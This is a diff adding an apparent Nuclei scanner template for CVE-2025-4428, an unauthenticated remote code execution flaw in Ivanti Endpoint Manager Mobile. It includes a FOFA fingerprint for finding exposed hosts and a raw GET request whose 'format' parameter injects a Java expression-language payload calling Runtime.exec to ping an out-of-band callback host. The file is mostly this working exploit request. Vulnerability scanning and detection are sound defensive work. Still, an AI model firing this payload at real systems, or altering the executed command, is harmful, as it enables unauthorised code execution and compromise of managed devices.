@@ -1,0 +1,25 @@
+id: Ivanti-EPMM-rce-CVE-2025-4428
+
+info:
+  name: "Ivanti Endpoint Manager Mobile API 权限验证缺陷导致远程代码执行"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: icon_hash="1983356674"
+      该漏洞源于Ivanti Endpoint Manager Mobile的API组件在处理用户输入时缺乏有效的验证机制，导致攻击者无需身份验证即可通过构造恶意请求执行任意代码。此缺陷允许远程攻击者绕过系统认证流程，直接在目标系统上执行预定义的系统命令，可能造成系统权限沦陷和数据泄露风险。
+  reference:
+  - https://mp.weixin.qq.com/s/Z8gFt5QsaiohJ9NUtELITA
+  tags: Ivanti,EPMM
+
+
+http:
+- raw:
+  - |
+    GET /api/v2/featureusage?adminDeviceSpaceId=131&format=%24%7b''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(''.getClass().forName('java.lang.Runtime')).exec('ping%20{{interactsh-url}}')%7d HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+  matchers:
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
